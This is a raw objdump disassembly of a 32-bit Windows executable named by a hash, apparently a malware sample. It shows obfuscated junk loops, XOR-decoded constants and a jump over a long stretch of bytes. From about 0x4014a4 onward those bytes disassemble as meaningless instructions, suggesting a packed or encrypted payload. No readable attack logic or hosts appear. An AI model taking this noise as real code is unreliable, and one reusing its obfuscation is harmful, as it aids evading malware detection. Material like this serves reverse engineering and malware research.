
84e3bd49ad70c3346bc546109238c482c4a875c804c0265cb24dc2fa4b619600.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421962
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421a6e
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4234ee
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4235b5
  4012ea:	push   0x423639
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	call   0x40914a
  401431:	test   eax,eax
  401433:	je     0x401464
  401439:	lea    eax,[ebp-0x90]
  40143f:	push   eax
  401440:	mov    eax,DWORD PTR [ebp-0x30]
  401443:	xor    eax,esi
  401445:	add    eax,edi
  401447:	push   eax
  401448:	mov    eax,DWORD PTR [ebp-0x2c]
  40144b:	add    eax,0xaa
  401450:	push   eax
  401451:	mov    eax,DWORD PTR [ebp-0x2c]
  401454:	mov    eax,DWORD PTR [eax+0x198]
  40145a:	push   DWORD PTR [eax]
  40145c:	call   0x405c6f
  401461:	mov    DWORD PTR [ebp-0x40],eax
  401464:	lea    eax,[ebp+0x4]
  401467:	mov    DWORD PTR [ebp-0x34],eax
  40146a:	mov    eax,DWORD PTR [ebp-0x8]
  40146d:	mov    eax,DWORD PTR [eax]
  40146f:	mov    eax,DWORD PTR [eax]
  401471:	mov    eax,DWORD PTR [eax]
  401473:	test   eax,eax
  401475:	je     0x4038ab
  40147b:	lea    eax,[ebp-0xc]
  40147e:	mov    DWORD PTR [ebp-0x4c],eax
  401481:	mov    eax,DWORD PTR [ebp-0x3c]
  401484:	mov    DWORD PTR [ebp-0xc],eax
  401487:	mov    eax,DWORD PTR [ebp-0x8]
  40148a:	mov    eax,DWORD PTR [eax]
  40148c:	mov    eax,DWORD PTR [eax]
  40148e:	mov    eax,DWORD PTR [eax]
  401490:	sub    DWORD PTR [ebp-0xc],eax
  401493:	mov    ecx,DWORD PTR [ebp-0x10]
  401496:	xor    ecx,esi
  401498:	mov    eax,0xffcd8d25
  40149d:	sub    eax,ecx
  40149f:	jmp    0x403854
  4014a4:	out    dx,al
  4014a5:	add    eax,0x6723a723
  4014aa:	outs   dx,BYTE PTR ds:[esi]
  4014ab:	sbb    DWORD PTR [edx+0x1b],0xf
  4014af:	hlt    
  4014b0:	mov    eax,0x62813a68
  4014b5:	bound  esp,QWORD PTR [edx+0x62]
  4014b8:	retf   0x625f
  4014bb:	bound  ecx,QWORD PTR [ecx]
  4014bd:	sub    eax,DWORD PTR [edi]
  4014bf:	pop    edx
  4014c0:	add    eax,0x792c0356
  4014c5:	pop    ebx
  4014c6:	jne    0x40150f
  4014c8:	xchg   ebx,eax
  4014c9:	inc    edi
  4014ca:	jb     0x401510
  4014cc:	jno    0x4014f3
  4014ce:	iret   
  4014cf:	retf   
  4014d0:	hlt    
  4014d1:	inc    ebp
  4014d2:	aam    0x97
  4014d4:	cdq    
  4014d5:	add    ebp,DWORD PTR [edx]
  4014d7:	pop    esp
  4014d8:	jno    0x401544
  4014da:	mov    es,WORD PTR [edx-0x43be3b9c]
  4014e0:	daa    
  4014e1:	mov    ecx,0x54f9627
  4014e6:	shr    BYTE PTR [ebp+eax*1+0x2],1
  4014ea:	adc    cl,al
  4014ec:	(bad)  
  4014ed:	(bad)  [esi-0x78]
  4014f0:	and    BYTE PTR [esi+0x31c900b0],dl
  4014f6:	dec    esi
  4014f7:	fbstp  TBYTE PTR [edx-0x62cc368d]
  4014fd:	mov    cs,WORD PTR [eax+0x78]
  401500:	jo     0x4014b8
  401502:	dec    edi
  401503:	pushf  
  401504:	pop    eax
  401505:	jae    0x401491
  401507:	sti    
  401508:	push   es
  401509:	push   0xc72c3d54
  40150e:	pop    esi
  40150f:	cmp    BYTE PTR [edx+0x6c],dl
  401512:	add    ecx,DWORD PTR [edi]
  401514:	push   ss
  401515:	jge    0x40153e
  401517:	mov    ebx,0xa6ab63c3
  40151c:	mov    esp,0xc531c291
  401521:	stc    
  401522:	inc    ebx
  401523:	popf   
  401524:	xchg   edx,eax
  401525:	in     eax,0x12
  401527:	fstp   QWORD PTR [edx]
  401529:	jg     0x4014c9
  40152b:	cmp    ecx,edi
  40152d:	mov    al,ds:0xdb808269
  401532:	dec    ecx
  401533:	loop   0x4014ee
  401535:	inc    eax
  401536:	or     BYTE PTR [ebx],0x2c
  401539:	inc    ebx
  40153a:	pop    ecx
  40153b:	mov    ecx,0xda183803
  401540:	xor    ebx,DWORD PTR [esi+0x22]
  401543:	sbb    ch,BYTE PTR [ebx+ecx*1]
  401546:	inc    esi
  401547:	add    esp,DWORD PTR [eax-0x32d94fe1]
  40154d:	dec    ebp
  40154e:	nop
  40154f:	xchg   edi,eax
  401550:	dec    esi
  401551:	mov    cl,0x25
  401553:	pop    ecx
  401554:	les    ebp,FWORD PTR [eax]
  401556:	sub    eax,ecx
  401558:	vpsubusw xmm0,xmm7,XMMWORD PTR [edi-0x25]
  40155d:	mov    edi,0xdb06d0ab
  401562:	test   al,0x7e
  401564:	bound  edx,QWORD PTR [ebp+0x268b1b46]
  40156a:	in     eax,0xc2
  40156c:	push   ds
  40156d:	sub    DWORD PTR [ebp+0x6c],0x51
  401571:	imul   ebp,edx,0x95ad0cb4
  401577:	inc    esi
  401578:	inc    ebp
  401579:	jp     0x40152f
  40157b:	add    BYTE PTR [esi+0x1004dcc9],0x93
  401582:	mov    esi,0xb6ba315c
  401587:	add    edi,DWORD PTR [edx+0x57]
  40158a:	or     esi,DWORD PTR [edi-0x308bd921]
  401590:	imul   ebp,DWORD PTR [edi-0x1f],0xff627bd9
  401597:	jns    0x401563
  401599:	repnz cmp esi,DWORD PTR [edx-0x1d]
  40159d:	sbb    ch,dh
  40159f:	inc    eax
  4015a0:	ins    DWORD PTR es:[edi],dx
  4015a1:	loop   0x40155c
  4015a3:	mov    edx,0x462baced
  4015a8:	xor    esi,DWORD PTR [edi+0x3debd4a6]
  4015ae:	dec    ebx
  4015af:	dec    eax
  4015b0:	ret    0xe91f
  4015b3:	dec    eax
  4015b4:	pop    ebp
  4015b5:	in     eax,dx
  4015b6:	or     al,0x89
  4015b8:	pop    esp
  4015b9:	out    dx,al
  4015ba:	lods   eax,DWORD PTR ds:[esi]
  4015bb:	aas    
  4015bc:	(bad)  
  4015bd:	mov    eax,ds:0xe78fb5e9
  4015c2:	das    
  4015c3:	lahf   
  4015c4:	jne    0x401572
  4015c6:	stos   DWORD PTR es:[edi],eax
  4015c7:	adc    bh,BYTE PTR [esi+0x56]
  4015ca:	xchg   ebx,eax
  4015cb:	and    BYTE PTR [esi-0x13],dh
  4015ce:	or     BYTE PTR [edi-0x47],ch
  4015d1:	mov    ebp,0xac4f646b
  4015d6:	mov    ds,WORD PTR [edx]
  4015d8:	and    eax,0x907fa072
  4015dd:	push   eax
  4015de:	dec    ecx
  4015df:	add    BYTE PTR [ebp-0x790b7b1b],0x40
  4015e6:	pusha  
  4015e7:	pop    eax
  4015e8:	mov    cl,0x97
  4015ea:	loope  0x40163c
  4015ec:	jmp    0xc0c7a8a8
  4015f1:	fnstsw WORD PTR [ebx]
  4015f3:	and    cl,dl
  4015f5:	sar    BYTE PTR [edi],cl
  4015f7:	pop    ebp
  4015f8:	dec    edi
  4015f9:	int    0x7f
  4015fb:	push   ds
  4015fc:	push   edi
  4015fd:	mov    WORD PTR [ebp-0x2d],?
  401600:	outs   dx,BYTE PTR ds:[esi]
  401601:	aas    
  401602:	imul   ebx,DWORD PTR [ebx+0x4a42585],0xffffffa7
  401609:	test   DWORD PTR [ebp+eiz*4+0x1f2cb4cf],ebx
  401610:	enter  0x65fd,0x23
  401614:	les    ebp,FWORD PTR [edx]
  401616:	mul    BYTE PTR [ebx+0x3c]
  401619:	push   esi
  40161a:	je     0x4015e7
  40161c:	cmp    edi,0x7d
  40161f:	jno    0x40161e
  401621:	sbb    eax,0x981b70b4
  401626:	sbb    BYTE PTR [ecx+0x23578d63],al
  40162c:	and    esi,ecx
  40162e:	push   0xffffffec
  401630:	adc    eax,0xc89a1caa
  401635:	sub    al,0x93
  401637:	xchg   esi,eax
  401638:	jl     0x4015ff
  40163a:	push   ecx
  40163b:	cdq    
  40163c:	mov    bl,0xc0
  40163e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40163f:	imul   esi,DWORD PTR [ebx+0x7fe4419],0xdc7fd9af
  401649:	or     al,BYTE PTR [ebx+0x12]
  40164c:	mov    edi,0xbd792bf9
  401651:	daa    
  401652:	(bad)  
  401654:	not    BYTE PTR [esi+0x1ac9e0e0]
  40165a:	add    ah,ah
  40165c:	fist   DWORD PTR [ebp+0x463376e0]
  401662:	jnp    0x4016cf
  401664:	pop    esi
  401665:	data16 das 
  401667:	data16 jne 0x40165b
  40166a:	outs   dx,DWORD PTR ds:[esi]
  40166b:	push   ebx
  40166c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40166d:	jmp    0x4016b7
  40166f:	mov    esp,0xb6f521c1
  401674:	add    ch,BYTE PTR [ebp-0x342c4f76]
  40167a:	leave  
  40167b:	js     0x401672
  40167d:	pushf  
  40167e:	cmp    ah,0x1d
  401681:	out    dx,eax
  401682:	mov    WORD PTR [eax+0x75b159d2],ds
  401688:	jae    0x4016a1
  40168a:	xchg   edx,eax
  40168b:	jecxz  0x401708
  40168d:	cwd    
  40168f:	mov    eax,esp
  401691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401692:	xchg   edx,eax
  401693:	or     BYTE PTR [edx-0x4132dbde],cl
  401699:	mov    ds:0x8b2d55ca,al
  40169e:	mov    cl,0x55
  4016a0:	popa   
  4016a1:	arpl   WORD PTR ds:0x2f7a9e0e,cx
  4016a7:	(bad)  
  4016a8:	cdq    
  4016a9:	aad    0xae
  4016ab:	xchg   ebp,eax
  4016ac:	fcom   DWORD PTR [ecx+ebx*4+0x5e]
  4016b0:	pop    esi
  4016b1:	adc    edi,0x854596d7
  4016b7:	ficomp DWORD PTR [esp+ebx*1-0xa]
  4016bb:	add    DWORD PTR [esi+0x4ba9b93c],eax
  4016c1:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4016c3:	(bad)  
  4016c4:	mov    dl,0x4c
  4016c6:	outs   dx,DWORD PTR ds:[esi]
  4016c7:	aaa    
  4016c8:	fbstp  TBYTE PTR [edx+0x7c]
  4016cb:	neg    DWORD PTR [ebx+0x41]
  4016ce:	sub    ah,bh
  4016d0:	or     ah,bl
  4016d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016d3:	push   ecx
  4016d4:	out    0x39,eax
  4016d6:	fild   DWORD PTR [eax-0x42]
  4016d9:	dec    edi
  4016da:	stos   DWORD PTR es:[edi],eax
  4016db:	imul   edi,DWORD PTR [edi+0x25],0xffffffaa
  4016df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016e0:	ja     0x4016f4
  4016e2:	push   esi
  4016e3:	pop    es
  4016e4:	push   ebx
  4016e5:	ret    
  4016e6:	add    dh,ah
  4016e8:	inc    ebx
  4016e9:	and    ecx,ebp
  4016eb:	cmp    DWORD PTR [ecx-0x4b],esp
  4016ee:	popa   
  4016ef:	sub    eax,eax
  4016f1:	mov    edx,0x5dc402b0
  4016f6:	sahf   
  4016f7:	xor    bl,ah
  4016f9:	or     al,0x54
  4016fb:	sar    BYTE PTR [edx+edi*4-0x31],1
  4016ff:	cwde   
  401700:	and    ebx,esi
  401702:	push   ebp
  401703:	mov    dh,0x1d
  401705:	mov    ch,ah
  401707:	pop    ds
  401708:	cmp    BYTE PTR [esp-0x40],dh
  40170c:	pop    ebp
  40170d:	jns    0x4016f2
  40170f:	into   
  401710:	loopne 0x401759
  401712:	stos   BYTE PTR es:[edi],al
  401713:	sub    al,0x64
  401715:	je     0x4016cd
  401717:	mov    esi,0xfdd8c687
  40171c:	sbb    dl,BYTE PTR [edi-0x1a82278c]
  401722:	sbb    al,0x2c
  401724:	je     0x4016b8
  401726:	add    DWORD PTR fs:[ecx-0x43837fc3],esi
  40172d:	mov    fs,ebp
  40172f:	stos   BYTE PTR es:[edi],al
  401730:	cmp    BYTE PTR [ecx],bl
  401732:	shl    DWORD PTR [ebx],cl
  401734:	push   0xf00aa8ea
  401739:	pop    ss
  40173a:	sub    DWORD PTR [ecx],edi
  40173c:	sub    al,0x92
  40173e:	loopne 0x4017b6
  401740:	mov    gs,WORD PTR [esi-0x4810b51e]
  401746:	dec    esi
  401747:	xor    DWORD PTR [ebp+eiz*4-0x4b],esp
  40174b:	rcl    BYTE PTR [ecx-0x58],0xa6
  40174f:	(bad)  
  401750:	shr    bl,cl
  401752:	xor    dl,BYTE PTR [esi-0x12]
  401755:	xchg   esp,eax
  401756:	jg     0x401710
  401758:	aam    0x88
  40175a:	xor    al,0xbf
  40175c:	xor    bh,BYTE PTR [ecx-0x45c53f3f]
  401762:	rcr    BYTE PTR [ecx-0x53df73fc],0xd8
  401769:	push   ds
  40176a:	popf   
  40176b:	or     DWORD PTR [ebx-0xdb52d35],0xb3fe4d98
  401775:	jle    0x40174d
  401777:	fadd   DWORD PTR [ebx+0x30674ab]
  40177d:	stos   BYTE PTR es:[edi],al
  40177e:	xlat   BYTE PTR ds:[ebx]
  40177f:	xchg   edx,eax
  401780:	cmc    
  401781:	mov    bh,BYTE PTR [edx]
  401783:	pop    ds
  401784:	xchg   esp,eax
  401785:	jmp    0xccaba84f
  40178a:	fwait
  40178b:	je     0x4017ee
  40178d:	mov    al,0xdf
  40178f:	rcr    BYTE PTR [ebp-0x3a5825ed],cl
  401795:	push   ss
  401796:	and    edi,esi
  401798:	pop    esi
  401799:	and    dh,dh
  40179b:	inc    edx
  40179c:	sub    al,0x1b
  40179e:	mov    WORD PTR [esi+0x584e929b],gs
  4017a4:	rcl    DWORD PTR [eax+0x77],cl
  4017a7:	(bad)  
  4017a8:	dec    ebx
  4017a9:	dec    dx
  4017ab:	xor    BYTE PTR [edi-0x36],bh
  4017ae:	push   ss
  4017af:	js     0x4017ad
  4017b1:	(bad)  
  4017b3:	repnz add BYTE PTR [eax],ah
  4017b6:	in     al,dx
  4017b7:	loope  0x4017fb
  4017b9:	push   edx
  4017ba:	mov    eax,0x644073bd
  4017bf:	(bad)  
  4017c0:	cs lock mov ch,ah
  4017c4:	leave  
  4017c5:	xchg   ebx,eax
  4017c6:	pop    eax
  4017c7:	pop    eax
  4017c8:	xchg   edx,eax
  4017c9:	dec    ebp
  4017ca:	repnz loope 0x4017f5
  4017cd:	pop    ecx
  4017ce:	add    DWORD PTR [edi],ecx
  4017d0:	push   ebx
  4017d1:	out    0x25,al
  4017d3:	add    al,0xfc
  4017d5:	push   ds
  4017d6:	ret    
  4017d7:	stos   DWORD PTR es:[edi],eax
  4017d8:	test   eax,0x5c8c8030
  4017dd:	mov    ds:0x8deef9c5,al
  4017e2:	int3   
  4017e3:	xor    eax,0x1c95b622
  4017e8:	xor    al,0x38
  4017ea:	mov    eax,0xa56c5f8
  4017ef:	stc    
  4017f0:	inc    edi
  4017f1:	jae    0x401853
  4017f3:	xchg   ecx,eax
  4017f4:	aam    0x47
  4017f6:	(bad)  
  4017f7:	pop    edx
  4017f8:	enter  0x4758,0xc4
  4017fc:	ror    DWORD PTR [ebx],cl
  4017fe:	and    edi,DWORD PTR [edi-0x9]
  401801:	jns    0x40183d
  401803:	mov    gs,WORD PTR [ecx-0x80]
  401806:	and    dl,BYTE PTR [ecx-0xca33b92]
  40180c:	jb     0x4017ab
  40180e:	mov    bl,0x99
  401810:	into   
  401811:	jmp    0x69d83705
  401816:	adc    edi,ecx
  401818:	shr    BYTE PTR [edx],1
  40181a:	sub    dh,dh
  40181c:	fistp  DWORD PTR [ebx]
  40181e:	or     eax,0xd5800701
  401823:	out    dx,eax
  401824:	dec    ebp
  401825:	pop    ss
  401826:	cmp    eax,0x8d8c0393
  40182b:	rol    esp,cl
  40182d:	xchg   edi,eax
  40182e:	ins    BYTE PTR es:[edi],dx
  40182f:	rol    DWORD PTR [edi+esi*4],0x1b
  401833:	push   ds
  401834:	sbb    eax,0xea9278dc
  401839:	fdiv   DWORD PTR [edi+0x78]
  40183c:	xor    BYTE PTR [bp+si-0x251a],bh
  401841:	std    
  401842:	test   bh,cl
  401844:	in     eax,dx
  401845:	outs   dx,BYTE PTR ds:[esi]
  401846:	sbb    BYTE PTR [ecx+ebp*1-0x56],ah
  40184a:	push   es
  40184b:	nop
  40184c:	aas    
  40184d:	mov    eax,DWORD PTR [esi]
  40184f:	and    BYTE PTR [edi-0x64],cl
  401852:	pushf  
  401853:	inc    ebx
  401854:	shl    ah,0x97
  401857:	fdiv   QWORD PTR [edi+0x4bf6863a]
  40185d:	adc    eax,0x94248e3f
  401862:	dec    esp
  401863:	jbe    0x401834
  401865:	adc    DWORD PTR [ebp+edx*2-0x63],esp
  401869:	adc    DWORD PTR [ebp-0x12],ecx
  40186c:	ja     0x401856
  40186e:	cli    
  40186f:	jmp    0x4018ca
  401871:	xchg   ebp,eax
  401872:	vpaddusb ymm7,ymm4,ymm2
  401876:	mov    ah,0xc5
  401878:	nop
  401879:	jo     0x40188d
  40187b:	jp     0x4018c3
  40187d:	mov    eax,ds:0xbfafd88a
  401882:	mov    DWORD PTR ds:0xd4d8b9e8,eax
  401888:	cwde   
  401889:	jmp    0xed65b471
  40188e:	push   edi
  40188f:	stos   BYTE PTR es:[edi],al
  401890:	xor    DWORD PTR [edi],esi
  401892:	add    al,0xc7
  401894:	into   
  401895:	data16 faddp st(7),st
  401898:	mov    ecx,0x950a65a3
  40189d:	cmp    eax,0x59200772
  4018a2:	(bad)  
  4018a3:	and    DWORD PTR [eax+edx*2],esi
  4018a6:	pusha  
  4018a7:	mov    eax,0x70321639
  4018ac:	nop
  4018ad:	out    0x0,al
  4018af:	cmp    BYTE PTR [edx+0x6b],bl
  4018b2:	popf   
  4018b3:	div    DWORD PTR [ebp+0x54]
  4018b6:	xchg   BYTE PTR [eax+0x7c33cc26],ch
  4018bc:	ds jp  0x40187f
  4018bf:	inc    edx
  4018c0:	xchg   eax,eax
  4018c2:	pop    ss
  4018c3:	stos   DWORD PTR es:[edi],eax
  4018c4:	add    eax,DWORD PTR fs:[edi+0x6c]
  4018c8:	adc    BYTE PTR [esi],0xe5
  4018cb:	sub    al,0x74
  4018cd:	xor    dl,cl
  4018cf:	mov    edx,0xc7ab6e6b
  4018d4:	xchg   ebp,eax
  4018d5:	dec    esp
  4018d6:	mov    cl,0xc0
  4018d8:	bound  ecx,QWORD PTR [ecx+0x42]
  4018db:	or     ah,BYTE PTR [edi-0x37]
  4018de:	test   esi,0x2f10bcd2
  4018e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018e5:	push   edi
  4018e6:	popf   
  4018e7:	mov    ch,0xf3
  4018e9:	ret    0xf889
  4018ec:	int3   
  4018ed:	pop    es
  4018ee:	sbb    BYTE PTR [eax-0x17],ah
  4018f1:	push   0x4f
  4018f3:	(bad)  [ebx+0x6fe6b8de]
  4018f9:	jo     0x4018c6
  4018fb:	lods   al,BYTE PTR ds:[esi]
  4018fc:	aaa    
  4018fd:	stc    
  4018fe:	sub    dh,BYTE PTR ds:0xc3f22ee0
  401904:	xchg   edi,eax
  401905:	repz or DWORD PTR [ebx-0x69],esp
  401909:	and    al,dl
  40190b:	test   al,0xaa
  40190d:	cli    
  40190e:	call   0x33f4f050
  401913:	in     eax,dx
  401914:	shl    DWORD PTR [edi-0x5958e2e3],1
  40191a:	sbb    edi,DWORD PTR [esi]
  40191c:	(bad)  
  40191d:	sti    
  40191e:	push   ebp
  40191f:	xor    edx,edx
  401921:	(bad)  
  401922:	xor    dh,al
